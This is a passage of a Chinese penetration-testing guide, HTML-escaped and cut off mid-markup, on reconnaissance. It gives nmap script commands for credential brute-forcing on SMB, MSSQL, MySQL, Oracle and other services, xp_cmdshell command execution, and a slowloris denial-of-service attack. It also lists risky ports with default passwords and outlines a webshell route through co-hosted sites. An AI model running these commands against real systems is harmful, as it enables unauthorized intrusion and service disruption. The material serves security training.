smb已知的几个漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 查看共享目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p 445 --script smb-ls--script-args ‘share=e\\$,path=\\\\,smbuser=test,smbpass=test’ 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#查询主机一些敏感信息（注：需要下载nmap_service）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p 445 -n –script=smb-psexec --script-args= smbuser=test,smbpass=test192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 查看会话&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=test,smbpass=test192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 系统信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=test,smbpass=test192.168.137.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;mssql扫描&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 破解mssql用户名密码&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# xp_cmdshell 执行命令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=\&quot;net user\&quot; 192.168.137.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;mysql扫描&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 扫描root空口令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap –p 3306 --script=mysql-empty-password.nse 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 列出所有mysql用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap –p 3306 --script=mysql-users.nse --script-args=mysqluser=root 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 支持同一应用的所有脚本扫描&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=mysql-\\* 192.168.137.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;oracle扫描&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# oracle sid扫描&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=oracle-sid-brute -p 1521-1560 192.168.137.5&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# oracle弱口令破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd192.168.137.5&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;其它好用的脚本&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=broadcast-netbios-master-browser 192.168.137.4 发现网关&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p 873 --script rsync-brute --script-args &#39;rsync-brute.module=www&#39; 192.168.137.4 破解rsync&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script informix-brute -p 9088 192.168.137.4 informix数据库破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p 5432 --script pgsql-brute 192.168.137.4 pgsql破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -sU --script snmp-brute 192.168.137.4 snmp破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -sV --script=telnet-brute 192.168.137.4 telnet破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=http-vuln-cve2010-0738 --script-args &#39;http-vuln-cve2010-0738.paths={/path1/,/path2/}&#39; &amp;#x26;lt;target&amp;#x26;gt; jboss autopwn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=http-methods.nse 192.168.137.4 检查http方法&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script http-slowloris --max-parallelism 400 192.168.137.4 dos攻击，对于处理能力较小的站点还挺好用的 &#39;half-HTTP&#39; connections&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=samba-vuln-cve-2012-1182 -p 139 192.168.137.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;可查看脚本内容，查找脚本所调用的文件，并修改。&lt;/p&gt;\n&lt;h2 id=\&quot;常见危险端口对应的服务\&quot;&gt;常见危险端口对应的服务&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#常见危险端口对应的服务\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;20：FTP服务的数据传输端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;21：FTP服务的连接端口，可能存在  弱口令暴力破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;22：SSH服务端口，可能存在 弱口令暴力破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;23：Telnet端口，可能存在 弱口令暴力破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;43：whois服务端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;53：DNS服务端口(TCP/UDP 53)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;67/68：DHCP服务端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;69：TFTP端口，可能存在弱口令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;80：HTTP端口，常见web漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;110：POP3邮件服务端口，和SMTP的25端口对应&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;135：RPC服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;137/138： NMB服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;139：SMB/CIFS服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;143：IMAP协议端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;161/162: Snmp服务，public弱口令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;389：LDAP目录访问协议，有可能存在注入、弱口令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;443：HTTPS端口，心脏滴血等与SSL有关的漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;512/513/514：Linux Rexec服务端口，可能存在爆破&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1080：socket端口，可能存在爆破&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1099：RMI，可能存在 RMI反序列化漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1433：SQL Server对外提供服务端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1521：oracle数据库端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;2049：NFS服务端口，可能存在NFS配置不当&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;2375：Docker端口，可能存在 Docker未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;2601:   Zebra ，默认密码zebr&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;3128:   squid ，匿名访问（可能内网漫游）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;3306：MySQL数据库端口，可能存在 弱口令暴力破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;4440：Rundeck，弱口令admin&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;4560：log4j SocketServer监听的端口，可能存在 log4j&amp;#x3C;=1.2.17反序列化漏洞（CVE-2019-17571）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;5432：PostGreSQL数据库的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;5632：PyAnywhere服务端口，可能存在代码执行漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;7180：Cloudera manager端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;8080-8090：可能存在web服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;9000：fastcgi端口，可能存在远程命令执行漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;9043/9090：WebSphere，可能存在WebSphere反序列化漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;10000：Webmin-Web控制面板，可能存在弱口令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;60020：hbase.regionserver.port，HRegionServer的RPC端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;60030：hbase.regionserver.info.port，HRegionServer的http端口&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;网站敏感目录和文件\&quot;&gt;网站敏感目录和文件&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#网站敏感目录和文件\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;后台目录：弱口令，万能密码，爆破&lt;/li&gt;\n&lt;li&gt;安装包：获取数据库信息，甚至是网站源码&lt;/li&gt;\n&lt;li&gt;上传目录：截断、上传图片马等&lt;/li&gt;\n&lt;li&gt;mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell&lt;/li&gt;\n&lt;li&gt;安装页面 ：可以二次安装进而绕过&lt;/li&gt;\n&lt;li&gt;phpinfo：会把你配置的各种信息暴露出来&lt;/li&gt;\n&lt;li&gt;编辑器：fck、ke、等&lt;/li&gt;\n&lt;li&gt;iis短文件利用：条件比较苛刻  windows、apache等&lt;/li&gt;\n&lt;li&gt;提到了网站敏感目录我们就不得不提 robots.txt 文件了&lt;/li&gt;\n&lt;li&gt;robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。\n假如编写的robots.txt文件内容如下：&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;User-agent: \\*&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Disallow: /data/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Disallow: /db/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Disallow: /admin/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Disallow: /manager/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Allow:/images/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/  即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。&lt;/p&gt;\n&lt;p&gt;虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。&lt;/p&gt;\n&lt;p&gt;探测目标网站后台目录的工具有： wwwscan 、御剑 、 dirbuster、cansina 等&lt;/p&gt;\n&lt;h2 id=\&quot;dirbuster\&quot;&gt;dirbuster&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#dirbuster\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Dirbuster是一种履带式和粗暴式的混合物; 它遵循它找到的页面中的所有链接，但也为可能的文件尝试不同的名称。这些名称可能位于与我们使用的文件类似的文件中，也可能由Dirbuster使用Pure Brute Force选项自动生成，并设置字符集以及生成的单词的最小和最大长度。&lt;/p&gt;\n&lt;p&gt;为确定文件是否存在，DirBuster使用服务器的响应代码。最常见的响应如下所示：&lt;/p&gt;\n&lt;p&gt;200 ok：文件存在&lt;/p&gt;\n&lt;p&gt;404找不到404文件：服务器中不存在该文件&lt;/p&gt;\n&lt;p&gt;301 301永久移动：这是重定向到给定的URL&lt;/p&gt;\n&lt;p&gt;401 Unauthorized:访问此文件需要身份验证&lt;/p&gt;\n&lt;p&gt;403 Forbidden：请求有效但服务器拒绝响应&lt;/p&gt;\n&lt;p&gt;基本用法：dirb 网站地址&lt;/p&gt;\n&lt;h1 id=\&quot;旁站和c段扫描\&quot;&gt;旁站和C段扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#旁站和c段扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！&lt;/p&gt;\n&lt;p&gt;对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。&lt;/p&gt;\n&lt;p&gt;旁站和C段在线查询地址：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;div class=\&quot;link-preview-block not-prose\&quot; data-state=\&quot;success\&quot;&gt;\n  &lt;a href=\&quot;http://www.webscan.cc/\&quot; target=\&quot;_blank\&quot; class=\&quot;group block overflow-hidden rounded-lg border border-border transition-all hover:border-primary/50 hover:shadow-md\&quot; aria-label=\&quot;同IP网站查询,C段查询,IP反查域名,在线C段,旁站工具 - WebScan - webscan.cc\&quot;&gt;\n    &lt;div class=\&quot;bg-card flex md:flex-col flex-row\&quot;&gt;\n      &lt;div class=\&quot;flex-1 p-4\&quot;&gt;\n        &lt;div class=\&quot;mb-2 flex items-center gap-2\&quot;&gt;\n          &lt;img src=\&quot;http://www.webscan.cc/favicon.ico\&quot; alt=\&quot;\&quot; class=\&quot;h-4 w-4 shrink-0\&quot; loading=\&quot;lazy\&quot; aria-hidden=\&quot;true\&quot;&gt;\n          &lt;span class=\&quot;text-muted-foreground truncate text-xs font-medium\&quot;&gt;webscan.cc&lt;/span&gt;\n        &lt;/div&gt;\n        &lt;h3 class=\&quot;text-foreground mb-2 line-clamp-2 font-semibold leading-tight\&quot;&gt;同IP网站查询,C段查询,IP反查域名,在线C段,旁站工具 - WebScan&lt;/h3&gt;\n        &lt;p class=\&quot;text-muted-foreground mb-3 line-clamp-2 text-sm\&quot;&gt;该网址工具能查询ip、ip地址、C段、同服务器上运行的其他网站,以及服务器IP上有多少个二级域名或旁站点。&lt;/p&gt;\n        &lt;div class=\&quot;text-primary flex items-center gap-1 text-xs\&quot;&gt;\n          &lt;span class=\&quot;truncate\&quot;&gt;http://www.webscan.cc/&lt;/span&gt;\n          &lt;svg class=\&quot;h-3 w-3 shrink-0 transition-transform group-hover:translate-x-0.5\&quot; aria-hidden=\&quot;true\&quot; viewBox=\&quot;0 0 12 12\&quot;&gt;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M4 3.5a.5.5 0 0 0-.5.5v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0 .5-.5v-.25a.75.75 0 0 1 1.5 0V8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h.25a.75.75 0 0 1 0 1.5zm2.75 0a.75.75 0 0 1 0-1.5h2.5a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-.69L7.28 5.78a.75.75 0 0 1-1.06-1.06L7.44 3.5z\&quot;&gt;&lt;/path&gt;&lt;/svg&gt; \n        &lt;/div&gt;\n      &lt;/div&gt;\n      \n    &lt;/div&gt;\n  &lt;/a&gt;\n&lt;/div&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;div class=\&quot;link-preview-block not-prose\&quot; data-state=\&quot;error\&quot;&gt;\n  &lt;a href=\&quot;https://phpinfo.me/bing.php\&quot; target=\&quot;_blank\&quot; class=\&quot;hover:border-primary/50 group block rounded-lg border bg-card p-4 transition-all hover:shadow-md\&quot; aria-label=\&quot;https://phpinfo.me/bing.php\&quot;&gt;\n    &lt;div class=\&quot;flex items-center justify-between gap-3\&quot;&gt;\n      &lt;div class=\&quot;flex items-center gap-3 min-w-0 flex-1\&quot;&gt;\n        &lt;div class=\&quot;bg-primary/10 text-primary flex h-10 w-10 shrink-0 items-center justify-center rounded-lg\&quot;&gt;\n          &lt;svg class=\&quot;h-5 w-5\&quot; viewBox=\&quot;0 0 24 24\&quot; aria-hidden=\&quot;true\&quot;&gt;&lt;path fill=\&quot;none\&quot; stroke=\&quot;currentColor\&quot; stroke-dasharray=\&quot;28\&quot; stroke-dashoffset=\&quot;28\&quot; stroke-linecap=\&quot;round\&quot; stroke-linejoin=\&quot;round\&quot; stroke-width=\&quot;2\&quot; d=\&quot;M13 6l2 -2c1 -1 3 -1 4 0l1 1c1 1 1 3 0 4l-5 5c-1 1 -3 1 -4 0M11 18l-2 2c-1 1 -3 1 -4 0l-1 -1c-1 -1 -1 -3 0 -4l5 -5c1 -1 3 -1 4 0\&quot;&gt;&lt;animate fill=\&quot;freeze\&quot; attributeName=\&quot;stroke-dashoffset\&quot; dur=\&quot;0.6s\&quot; values=\&quot;28;0\&quot;&gt;&lt;/animate&gt;&lt;/path&gt;&lt;/svg&gt;\n        &lt;/div&gt;\n        &lt;div class=\&quot;min-w-0 flex-1\&quot;&gt;\n          &lt;div class=\&quot;text-foreground font-medium truncate\&quot;&gt;https://phpinfo.me/bing.php&lt;/div&gt;\n          &lt;div class=\&quot;text-muted-foreground text-xs truncate mt-0.5\&quot;&gt;phpinfo.me&lt;/div&gt;\n        &lt;/div&gt;\n      &lt;/div&gt;\n      &lt;svg class=\&quot;text-primary h-5 w-5 shrink-0 transition-transform group-hover:translate-x-1\&quot; fill=\&quot;none\&quot; stroke=\&quot;currentColor\&quot; viewBox=\&quot;0 0 24 24\&quot;&gt;\n        &lt;path stroke-linecap=\&quot;round\&quot; stroke-linejoin=\&quot;round\&quot; stroke-width=\&quot;2\&quot; d=\&quot;M14 5l7 7m0 0l-7 7m7-7H3\&quot;&gt;&lt;/path&gt;\n      &lt;/svg&gt;\n    &lt;/div&gt;\n  